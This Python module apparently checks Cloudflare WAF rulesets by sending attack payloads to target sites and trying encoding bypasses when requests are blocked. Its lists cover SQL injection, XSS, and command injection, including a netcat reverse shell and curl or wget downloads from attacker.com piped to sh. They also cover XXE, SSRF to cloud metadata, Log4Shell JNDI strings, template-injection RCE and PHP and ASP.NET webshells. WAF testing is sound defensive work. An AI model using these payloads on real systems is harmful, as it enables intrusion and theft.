"""WAF testing module for Cloudflare OWASP and Managed rulesets."""

import asyncio
import random
import string
import base64
import urllib.parse
from enum import Enum, auto
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
import logging

from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TaskProgressColumn
from rich.console import Console

from .http_engine import HTTPEngine, HTTPMethod, HTTPResponse
from .config import Config, WAFRuleset
from .bypass_techniques import BypassTechniques

logger = logging.getLogger(__name__)
console = Console()


OWASP_DOCS = {
    "A01:2021": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
    "A02:2021": "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
    "A03:2021": "https://owasp.org/Top10/A03_2021-Injection/",
    "A04:2021": "https://owasp.org/Top10/A04_2021-Insecure_Design/",
    "A05:2021": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
    "A06:2021": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/",
    "A07:2021": "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
    "A08:2021": "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/",
    "A09:2021": "https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/",
    "A10:2021": "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
}

CVE_DOCS = {
    "CVE-2021-44228": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",  # Log4Shell
    "CVE-2021-45046": "https://nvd.nist.gov/vuln/detail/CVE-2021-45046",  # Log4j
    "CVE-2017-5638": "https://nvd.nist.gov/vuln/detail/CVE-2017-5638",   # Apache Struts
    "CVE-2019-11043": "https://nvd.nist.gov/vuln/detail/CVE-2019-11043", # PHP-FPM
    "CVE-2021-41773": "https://nvd.nist.gov/vuln/detail/CVE-2021-41773", # Apache Path Traversal
    "CVE-2021-26855": "https://nvd.nist.gov/vuln/detail/CVE-2021-26855", # ProxyLogon
    "CVE-2021-34473": "https://nvd.nist.gov/vuln/detail/CVE-2021-34473", # ProxyShell
    "CVE-2022-22965": "https://nvd.nist.gov/vuln/detail/CVE-2022-22965", # Spring4Shell
}

CWE_DOCS = {
    "CWE-79": "https://cwe.mitre.org/data/definitions/79.html",    # XSS
    "CWE-89": "https://cwe.mitre.org/data/definitions/89.html",    # SQL Injection
    "CWE-78": "https://cwe.mitre.org/data/definitions/78.html",    # OS Command Injection
    "CWE-22": "https://cwe.mitre.org/data/definitions/22.html",    # Path Traversal
    "CWE-611": "https://cwe.mitre.org/data/definitions/611.html",  # XXE
    "CWE-918": "https://cwe.mitre.org/data/definitions/918.html",  # SSRF
    "CWE-1336": "https://cwe.mitre.org/data/definitions/1336.html", # SSTI
    "CWE-917": "https://cwe.mitre.org/data/definitions/917.html",  # Expression Language Injection
    "CWE-94": "https://cwe.mitre.org/data/definitions/94.html",    # Code Injection
    "CWE-113": "https://cwe.mitre.org/data/definitions/113.html",  # HTTP Header Injection
}


@dataclass
class WAFTestCase:
    """A WAF test case definition."""
    name: str
    category: str
    ruleset: str
    payload: str
    method: HTTPMethod
    injection_point: str
    expected_block: bool
    description: str
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None
    cve_id: Optional[str] = None
    
    def get_cwe_url(self) -> Optional[str]:
        """Get the CWE documentation URL."""
        if self.cwe_id:
            return CWE_DOCS.get(self.cwe_id, f"https://cwe.mitre.org/data/definitions/{self.cwe_id.split('-')[1]}.html")
        return None
    
    def get_owasp_url(self) -> Optional[str]:
        """Get the OWASP documentation URL."""
        if self.owasp_category:
            key = self.owasp_category.split("-")[0].strip()
            return OWASP_DOCS.get(key)
        return None
    
    def get_cve_url(self) -> Optional[str]:
        """Get the CVE documentation URL."""
        if self.cve_id:
            return CVE_DOCS.get(self.cve_id, f"https://nvd.nist.gov/vuln/detail/{self.cve_id}")
        return None


@dataclass
class WAFTestResult:
    """Result of a WAF test."""
    test_case: WAFTestCase
    target: str
    response_code: int
    blocked: bool
    challenge_presented: bool
    response_time: float
    cf_ray: Optional[str]
    bypass_successful: bool
    bypass_technique: Optional[str] = None
    raw_response: Optional[str] = None
    notes: List[str] = field(default_factory=list)


class WAFTester:
    """
    WAF tester for Cloudflare OWASP Core Ruleset and Managed Ruleset.
    
    Tests various attack vectors to verify WAF protection is working correctly.
    """
    
    SQL_INJECTION_PAYLOADS = [
        ("' OR '1'='1", "Basic SQLi - OR bypass"),
        ("' OR '1'='1'--", "SQLi with comment"),
        ("' OR '1'='1'/*", "SQLi with block comment"),
        ("1' AND '1'='1", "SQLi AND condition"),
        ("1 UNION SELECT NULL,NULL,NULL--", "UNION based SQLi"),
        ("1 UNION SELECT username,password FROM users--", "UNION data extraction"),
        ("'; DROP TABLE users;--", "SQLi DROP TABLE"),
        ("1'; EXEC xp_cmdshell('whoami');--", "SQLi command execution"),
        ("' OR 1=1#", "MySQL comment SQLi"),
        ("admin'--", "Simple auth bypass"),
        ("1' ORDER BY 1--+", "ORDER BY injection"),
        ("1' GROUP BY 1--+", "GROUP BY injection"),
        ("-1' UNION SELECT 1,2,3--+", "Negative UNION SQLi"),
        ("1' AND SLEEP(5)--", "Time-based blind SQLi"),
        ("1' AND BENCHMARK(10000000,SHA1('test'))--", "Benchmark SQLi"),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "Subquery sleep SQLi"),
        ("1' WAITFOR DELAY '0:0:5'--", "MSSQL time delay"),
        ("1'; SHUTDOWN;--", "MSSQL shutdown"),
        ("1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "Error-based SQLi"),
        ("1' AND extractvalue(1,concat(0x7e,(SELECT version())))--", "ExtractValue SQLi"),
    ]
    
    XSS_PAYLOADS = [
        ("<script>alert('XSS')</script>", "Basic script tag XSS"),
        ("<img src=x onerror=alert('XSS')>", "IMG onerror XSS"),
        ("<svg onload=alert('XSS')>", "SVG onload XSS"),
        ("<body onload=alert('XSS')>", "Body onload XSS"),
        ("javascript:alert('XSS')", "JavaScript protocol XSS"),
        ("<iframe src='javascript:alert(1)'>", "Iframe XSS"),
        ("<input onfocus=alert('XSS') autofocus>", "Input autofocus XSS"),
        ("<marquee onstart=alert('XSS')>", "Marquee XSS"),
        ("<details open ontoggle=alert('XSS')>", "Details ontoggle XSS"),
        ("<video><source onerror=alert('XSS')>", "Video source XSS"),
        ("'><script>alert(String.fromCharCode(88,83,83))</script>", "Encoded XSS"),
        ("<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>", "Base64 encoded XSS"),
        ("<svg/onload=alert('XSS')>", "SVG without space"),
        ("<<script>alert('XSS')//<</script>", "Nested tags XSS"),
        ("<scr<script>ipt>alert('XSS')</scr</script>ipt>", "Split tag XSS"),
        ("\"><img src=x onerror=alert('XSS')>", "Attribute escape XSS"),
        ("'-alert('XSS')-'", "JS string break XSS"),
        ("</title><script>alert('XSS')</script>", "Title escape XSS"),
        ("</textarea><script>alert('XSS')</script>", "Textarea escape XSS"),
        ("<math><maction actiontype='statusline#http://google.com' xlink:href='javascript:alert(1)'>", "MathML XSS"),
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        ("; ls -la", "Basic command injection"),
        ("| cat /etc/passwd", "Pipe command injection"),
        ("& whoami", "Ampersand command injection"),
        ("`id`", "Backtick command injection"),
        ("$(id)", "Dollar command injection"),
        ("; cat /etc/passwd", "Semicolon injection"),
        ("|| whoami", "OR command injection"),
        ("&& id", "AND command injection"),
        ("\n/bin/cat /etc/passwd", "Newline injection"),
        ("; ping -c 10 127.0.0.1", "Ping command injection"),
        ("| nc -e /bin/sh attacker.com 4444", "Netcat reverse shell"),
        ("; curl http://attacker.com/shell.sh | sh", "Curl shell download"),
        ("$(curl http://attacker.com/shell.sh | sh)", "Nested curl injection"),
        ("`wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m`", "Wget injection"),
        ("| python -c 'import os; os.system(\"id\")'", "Python injection"),
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        ("../../../etc/passwd", "Basic path traversal"),
        ("....//....//....//etc/passwd", "Double dot traversal"),
        ("..%2f..%2f..%2fetc/passwd", "URL encoded traversal"),
        ("..%252f..%252f..%252fetc/passwd", "Double URL encoded"),
        ("/etc/passwd%00", "Null byte injection"),
        ("....\/....\/....\/etc/passwd", "Backslash traversal"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "Full URL encoded"),
        ("..%c0%af..%c0%af..%c0%afetc/passwd", "UTF-8 encoded traversal"),
        ("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "Unicode slash traversal"),
        ("/proc/self/environ", "Proc environ access"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper"),
        ("file:///etc/passwd", "File protocol"),
        ("....//....//....//windows/system32/config/sam", "Windows SAM traversal"),
        ("%252e%252e%252f%252e%252e%252fetc/passwd", "Triple encoded"),
    ]
    
    XXE_PAYLOADS = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "Basic XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>', "External XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>', "Parameter entity XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>', "Expect wrapper XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', "PHP filter XXE"),
    ]
    
    SSRF_PAYLOADS = [
        ("http://localhost/admin", "Localhost SSRF"),
        ("http://127.0.0.1/admin", "Loopback SSRF"),
        ("http://[::1]/admin", "IPv6 localhost SSRF"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata SSRF"),
        ("http://metadata.google.internal/", "GCP metadata SSRF"),
        ("http://169.254.169.254/metadata/v1/", "Azure metadata SSRF"),
        ("http://0.0.0.0:22", "Zero IP SSRF"),
        ("http://127.1/admin", "Short loopback SSRF"),
        ("http://2130706433/", "Decimal IP SSRF"),
        ("http://0x7f000001/", "Hex IP SSRF"),
        ("gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "Gopher SSRF"),
        ("dict://localhost:11211/stats", "Dict protocol SSRF"),
        ("file:///etc/passwd", "File protocol SSRF"),
    ]
    
    LDAP_INJECTION_PAYLOADS = [
        ("*)(uid=*))(|(uid=*", "LDAP injection"),
        ("admin)(&)", "LDAP filter bypass"),
        ("*)(objectClass=*", "LDAP wildcard injection"),
        ("admin))(|(password=*", "LDAP password extraction"),
    ]
    
    TEMPLATE_INJECTION_PAYLOADS = [
        ("{{7*7}}", "Jinja2/Twig basic SSTI"),
        ("${7*7}", "Generic template injection"),
        ("#{7*7}", "Ruby ERB injection"),
        ("<%= 7*7 %>", "ERB injection"),
        ("{{constructor.constructor('return this')()}}", "Angular SSTI"),
        ("{{config}}", "Flask config disclosure"),
        ("{{self.__class__.__mro__[2].__subclasses__()}}", "Python SSTI RCE"),
        ("${{<%[%'\"}}%\\", "Polyglot template injection"),
        ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "Jinja2 RCE"),
    ]
    
    HEADER_INJECTION_PAYLOADS = [
        ("value\r\nX-Injected: true", "CRLF injection"),
        ("value%0d%0aX-Injected: true", "URL encoded CRLF"),
        ("value\nSet-Cookie: injected=true", "Cookie injection via CRLF"),
        ("value\r\n\r\n<html>injected</html>", "Response splitting"),
    ]
    
    LOG4J_PAYLOADS = [
        ("${jndi:ldap://attacker.com/exploit}", "Log4j basic"),
        ("${jndi:rmi://attacker.com/exploit}", "Log4j RMI"),
        ("${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}", "Log4j obfuscated"),
        ("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}", "Log4j heavy obfuscation"),
        ("${jndi:ldap://127.0.0.1#attacker.com/exploit}", "Log4j DNS bypass"),
    ]
    
    PROTOTYPE_POLLUTION_PAYLOADS = [
        ('{"__proto__":{"admin":true}}', "Prototype pollution basic"),
        ('{"constructor":{"prototype":{"admin":true}}}', "Constructor pollution"),
        ('{"__proto__":{"shell":"/bin/sh"}}', "Prototype shell injection"),
    ]
    
    CLOUDFLARE_MANAGED_SPECIFIC = [
        ("<?php system($_GET['cmd']); ?>", "PHP webshell", "php-injection"),
        ("<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\");%>", "ASP.NET webshell", "aspnet-injection"),
        (".htaccess", "Apache htaccess access", "sensitive-files"),
        ("wp-config.php", "WordPress config access", "wordpress"),
        ("/wp-admin/admin-ajax.php?action=duplicator_download", "WordPress Duplicator vuln", "wordpress-cve"),
        ("SELECT * FROM wp_users", "WordPress SQLi", "wordpress"),
        ("phpMyAdmin", "phpMyAdmin access", "admin-panels"),
        ("/administrator/", "Joomla admin access", "joomla"),
        ("Drupal.settings", "Drupal settings access", "drupal"),
        ("/etc/shadow", "Shadow file access", "sensitive-files"),
        ("/aws/credentials", "AWS credentials access", "cloud-credentials"),
        (".env", "Environment file access", "sensitive-files"),
        ("/debug/pprof/", "Go pprof debug access", "debug-endpoints"),
        ("/.git/config", "Git config access", "sensitive-files"),
        ("/server-status", "Apache server status", "debug-endpoints"),
        ("wp-content/debug.log", "WordPress debug log", "wordpress"),
    ]
    
    def __init__(self, http_engine: HTTPEngine, config: Config):
        self.http_engine = http_engine
        self.config = config
        self.bypass_techniques = BypassTechniques() if config.use_bypass_techniques else None
        self.results: List[WAFTestResult] = []
        self.blocked_count = 0
        self.passed_count = 0
        self.bypass_count = 0
    
    def _print_verbose_test_info(self, test_case: WAFTestCase, target: str, url: str, 
                                   headers: dict, params: dict, data: Optional[str]):
        """Print verbose information about the test case being executed."""
        console.print(f"\n[bold white on blue] TEST CASE [/]")
        console.print(f"[bold cyan]Name:[/] {test_case.name}")
        console.print(f"[bold cyan]Category:[/] {test_case.category}")
        console.print(f"[bold cyan]Description:[/] {test_case.description}")
        
        if test_case.cwe_id:
            cwe_url = test_case.get_cwe_url()
            console.print(f"[bold cyan]CWE:[/] {test_case.cwe_id} - {cwe_url}")
        
        if test_case.owasp_category:
            owasp_url = test_case.get_owasp_url()
            console.print(f"[bold cyan]OWASP:[/] {test_case.owasp_category}")
            if owasp_url:
                console.print(f"[bold cyan]OWASP Doc:[/] {owasp_url}")
        
        if test_case.cve_id:
            cve_url = test_case.get_cve_url()
            console.print(f"[bold red]CVE:[/] {test_case.cve_id} - {cve_url}")
        
        console.print(f"\n[bold yellow]HTTP Request:[/]")
        console.print(f"  [cyan]Method:[/] {test_case.method.name}")
        console.print(f"  [cyan]URL:[/] {url}")
        
        if params:
            console.print(f"  [cyan]Query Params:[/] {params}")
        
        if headers:
            console.print(f"  [cyan]Headers:[/]")
            for k, v in headers.items():
                display_v = v[:80] + "..." if len(v) > 80 else v
                console.print(f"    {k}: {display_v}")
        
        if data:
            display_data = data[:200] + "..." if len(data) > 200 else data
            console.print(f"  [cyan]Body:[/] {display_data}")
        
        console.print(f"  [cyan]Payload:[/] [yellow]{test_case.payload[:100]}{'...' if len(test_case.payload) > 100 else ''}[/]")
        console.print(f"  [cyan]Injection Point:[/] {test_case.injection_point}")
    
    def _print_verbose_result(self, result: WAFTestResult, response: 'HTTPResponse' = None):
        """Print verbose result information."""
        if result.blocked:
            console.print(f"[bold green]Result: BLOCKED[/] (Status: {result.response_code}, Time: {result.response_time:.3f}s)")
        else:
            console.print(f"[bold red]Result: NOT BLOCKED[/] (Status: {result.response_code}, Time: {result.response_time:.3f}s)")
        
        cf_ray = result.cf_ray or (response.cf_ray if response else None)
        if cf_ray:
            console.print(f"[cyan]CF-Ray:[/] {cf_ray}")
        
        if response and response.redirected:
            console.print(f"[yellow]Redirected:[/] {response.redirect_count} redirect(s)")
            console.print(f"[yellow]Final URL:[/] {response.final_url}")
        
        console.print(f"\n[bold yellow]Server Response:[/]")
        body = (response.body if response else None) or result.raw_response
        if body and len(body) > 0:
            response_preview = body[:1500]
            if len(body) > 1500:
                response_preview += "\n... [truncated]"
            console.print(f"[dim]{response_preview}[/]")
        else:
            console.print(f"[dim](empty response)[/]")
        
        console.print("─" * 60)
    
    async def run(self) -> List[WAFTestResult]:
        """Run WAF tests based on configuration."""
        test_cases = self._generate_test_cases()
        
        for target in self.config.get_target_urls():
            console.print(f"\n[bold cyan]Target:[/] {target}")
            console.print(f"[bold cyan]Ruleset:[/] {self.config.waf_ruleset.name}")
            console.print(f"[bold cyan]Total Test Cases:[/] {len(test_cases)}")
            console.print(f"[bold cyan]Bypass Testing:[/] {'Enabled' if self.config.use_bypass_techniques else 'Disabled'}")
            console.print(f"[bold cyan]Verbose Mode:[/] {'Enabled' if self.config.verbose else 'Disabled'}\n")
            
            self.blocked_count = 0
            self.passed_count = 0
            self.bypass_count = 0
            
            if self.config.verbose:
                for i, test_case in enumerate(test_cases, 1):
                    console.print(f"\n[bold white]Test {i}/{len(test_cases)}[/]")
                    result = await self._run_test_case(test_case, target, verbose=True)
                    self.results.append(result)
                    
                    if result.blocked:
                        self.blocked_count += 1
                    else:
                        self.passed_count += 1
                    
                    if self.config.use_bypass_techniques and result.blocked:
                        bypass_results = await self._try_bypass(test_case, target)
                        self.results.extend(bypass_results)
                        
                        for br in bypass_results:
                            if br.bypass_successful:
                                self.bypass_count += 1
                                console.print(f"[bold red]  ⚠ BYPASS SUCCESSFUL using {br.bypass_technique}![/]")
            else:
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[bold blue]{task.description}"),
                    BarColumn(bar_width=40),
                    TaskProgressColumn(),
                    TextColumn("|"),
                    TextColumn("[green]Blocked:{task.fields[blocked]}"),
                    TextColumn("[yellow]Passed:{task.fields[passed]}"),
                    TextColumn("[red]Bypassed:{task.fields[bypassed]}"),
                    TextColumn("|"),
                    TimeElapsedColumn(),
                    console=console,
                    refresh_per_second=10
                ) as progress:
                    task = progress.add_task(
                        "WAF Testing",
                        total=len(test_cases),
                        blocked=0,
                        passed=0,
                        bypassed=0
                    )
                    
                    for test_case in test_cases:
                        result = await self._run_test_case(test_case, target, verbose=False)
                        self.results.append(result)
                        
                        if result.blocked:
                            self.blocked_count += 1
                        else:
                            self.passed_count += 1
                        
                        if self.config.use_bypass_techniques and result.blocked:
                            bypass_results = await self._try_bypass(test_case, target)
                            self.results.extend(bypass_results)
                            
                            for br in bypass_results:
                                if br.bypass_successful:
                                    self.bypass_count += 1
                        
                        progress.update(
                            task,
                            advance=1,
                            blocked=self.blocked_count,
                            passed=self.passed_count,
                            bypassed=self.bypass_count
                        )
            
            console.print(f"\n[bold]WAF Test Summary for {target}:[/]")
            console.print(f"  [green]Blocked:[/] {self.blocked_count}/{len(test_cases)}")
            console.print(f"  [yellow]Passed (not blocked):[/] {self.passed_count}/{len(test_cases)}")
            if self.config.use_bypass_techniques:
                console.print(f"  [red]Bypasses Found:[/] {self.bypass_count}")
        
        await self.http_engine.close()
        return self.results
    
    def _generate_test_cases(self) -> List[WAFTestCase]:
        """Generate test cases based on selected ruleset."""
        test_cases = []
        
        if self.config.waf_ruleset in [WAFRuleset.OWASP, WAFRuleset.BOTH]:
            test_cases.extend(self._generate_owasp_test_cases())
        
        if self.config.waf_ruleset in [WAFRuleset.CLOUDFLARE_MANAGED, WAFRuleset.BOTH]:
            test_cases.extend(self._generate_managed_test_cases())
        
        return test_cases
    
    def _generate_owasp_test_cases(self) -> List[WAFTestCase]:
        """Generate OWASP Core Ruleset test cases."""
        test_cases = []
        
        for payload, desc in self.SQL_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"SQLi: {desc}",
                category="SQL Injection",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-89",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.XSS_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"XSS: {desc}",
                category="Cross-Site Scripting",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-79",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.COMMAND_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"CMDi: {desc}",
                category="Command Injection",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-78",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.PATH_TRAVERSAL_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"LFI: {desc}",
                category="Path Traversal",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="path",
                expected_block=True,
                description=desc,
                cwe_id="CWE-22",
                owasp_category="A01:2021-Broken Access Control"
            ))
        
        for payload, desc in self.XXE_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"XXE: {desc}",
                category="XML External Entity",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.POST,
                injection_point="body",
                expected_block=True,
                description=desc,
                cwe_id="CWE-611",
                owasp_category="A05:2021-Security Misconfiguration"
            ))
        
        for payload, desc in self.SSRF_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"SSRF: {desc}",
                category="Server-Side Request Forgery",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-918",
                owasp_category="A10:2021-SSRF"
            ))
        
        for payload, desc in self.TEMPLATE_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"SSTI: {desc}",
                category="Server-Side Template Injection",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-1336",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.LOG4J_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"Log4Shell: {desc}",
                category="Log4j RCE",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="header",
                expected_block=True,
                cve_id="CVE-2021-44228",
                description=desc,
                cwe_id="CWE-917",
                owasp_category="A06:2021-Vulnerable Components"
            ))
        
        return test_cases
    
    def _generate_managed_test_cases(self) -> List[WAFTestCase]:
        """Generate Cloudflare Managed Ruleset test cases."""
        test_cases = []
        
        for payload, desc, category in self.CLOUDFLARE_MANAGED_SPECIFIC:
            test_cases.append(WAFTestCase(
                name=f"CF-Managed: {desc}",
                category=category,
                ruleset="Cloudflare Managed",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param" if "=" not in payload else "path",
                expected_block=True,
                description=desc
            ))
        
        test_cases.extend(self._generate_owasp_test_cases())
        
        scanner_payloads = [
            ("Nikto", "Nikto scanner UA"),
            ("sqlmap", "SQLmap scanner UA"),
            ("Nessus", "Nessus scanner UA"),
            ("Burp", "Burp Suite scanner"),
            ("OWASP ZAP", "ZAP scanner UA"),
            ("Acunetix", "Acunetix scanner UA"),
            ("Nmap", "Nmap scanner UA"),
        ]
        
        for ua, desc in scanner_payloads:
            test_cases.append(WAFTestCase(
                name=f"Scanner: {desc}",
                category="scanner-detection",
                ruleset="Cloudflare Managed",
                payload=ua,
                method=HTTPMethod.GET,
                injection_point="user_agent",
                expected_block=True,
                description=desc
            ))
        
        return test_cases
    
    async def _run_test_case(self, test_case: WAFTestCase, target: str, verbose: bool = False) -> WAFTestResult:
        """Run a single test case."""
        
        url = target
        headers = {}
        params = {}
        data = None
        
        if test_case.injection_point == "query_param":
            params = {"test": test_case.payload}
        elif test_case.injection_point == "path":
            url = f"{target.rstrip('/')}/{test_case.payload}"
        elif test_case.injection_point == "body":
            data = test_case.payload
            headers["Content-Type"] = "application/xml" if "xml" in test_case.payload.lower() else "application/x-www-form-urlencoded"
        elif test_case.injection_point == "header":
            headers["X-Test"] = test_case.payload
            headers["User-Agent"] = test_case.payload
        elif test_case.injection_point == "user_agent":
            headers["User-Agent"] = test_case.payload
        
        if verbose:
            self._print_verbose_test_info(test_case, target, url, headers, params, data)
        
        response = await self.http_engine.request(
            url,
            test_case.method,
            headers=headers,
            params=params,
            data=data,
            timeout=self.config.timeout
        )
        
        blocked = self._is_blocked(response)
        
        result = WAFTestResult(
            test_case=test_case,
            target=target,
            response_code=response.status_code,
            blocked=blocked,
            challenge_presented=response.challenge_presented,
            response_time=response.elapsed_time,
            cf_ray=response.cf_ray,
            bypass_successful=False,
            raw_response=response.body[:1500] if response.body else ""
        )
        
        if verbose:
            self._print_verbose_result(result, response)
        
        return result
    
    def _is_blocked(self, response: HTTPResponse) -> bool:
        """Determine if a request was blocked by WAF."""
        if response.status_code in [403, 406, 429, 503]:
            block_indicators = [
                "blocked",
                "access denied", 
                "forbidden",
                "attention required",
                "security check",
                "please wait",
                "checking your browser",
                "ray id",
            ]
            if response.body:
                body_lower = response.body.lower()
                if any(indicator in body_lower for indicator in block_indicators):
                    return True
            return True
        
        if response.challenge_presented:
            return True
        
        return False
    
    async def _try_bypass(self, test_case: WAFTestCase, target: str) -> List[WAFTestResult]:
        """Try various bypass techniques for a blocked payload."""
        if not self.bypass_techniques:
            return []
        
        bypass_results = []
        
        encodings = self.bypass_techniques.get_waf_evasion_encoding(test_case.payload)
        
        for encoding_name, encoded_payload in encodings[1:]:
            modified_test = WAFTestCase(
                name=f"{test_case.name} ({encoding_name})",
                category=test_case.category,
                ruleset=test_case.ruleset,
                payload=encoded_payload,
                method=test_case.method,
                injection_point=test_case.injection_point,
                expected_block=test_case.expected_block,
                description=f"{test_case.description} with {encoding_name} encoding"
            )
            
            result = await self._run_test_case(modified_test, target)
            result.bypass_technique = encoding_name
            result.bypass_successful = not result.blocked
            
            bypass_results.append(result)
            
            if result.bypass_successful:
                logger.warning(f"Bypass successful using {encoding_name} for {test_case.name}")
        
        for content_type in self.bypass_techniques.get_content_type_variations()[:5]:
            if test_case.method == HTTPMethod.POST:
                url = target
                headers = {"Content-Type": content_type}
                
                response = await self.http_engine.request(
                    url,
                    HTTPMethod.POST,
                    headers=headers,
                    data=test_case.payload,
                    timeout=self.config.timeout
                )
                
                blocked = self._is_blocked(response)
                
                result = WAFTestResult(
                    test_case=test_case,
                    target=target,
                    response_code=response.status_code,
                    blocked=blocked,
                    challenge_presented=response.challenge_presented,
                    response_time=response.elapsed_time,
                    cf_ray=response.cf_ray,
                    bypass_successful=not blocked,
                    bypass_technique=f"Content-Type: {content_type}"
                )
                
                bypass_results.append(result)
        
        return bypass_results
    
    def get_summary(self) -> Dict[str, Any]:
        """Get a summary of test results."""
        total = len(self.results)
        blocked = sum(1 for r in self.results if r.blocked)
        bypassed = sum(1 for r in self.results if r.bypass_successful)
        challenged = sum(1 for r in self.results if r.challenge_presented)
        
        by_category: Dict[str, Dict[str, int]] = {}
        for result in self.results:
            cat = result.test_case.category
            if cat not in by_category:
                by_category[cat] = {"total": 0, "blocked": 0, "bypassed": 0}
            by_category[cat]["total"] += 1
            if result.blocked:
                by_category[cat]["blocked"] += 1
            if result.bypass_successful:
                by_category[cat]["bypassed"] += 1
        
        return {
            "total_tests": total,
            "blocked": blocked,
            "bypassed": bypassed,
            "challenged": challenged,
            "block_rate": blocked / total * 100 if total > 0 else 0,
            "bypass_rate": bypassed / total * 100 if total > 0 else 0,
            "by_category": by_category
        }
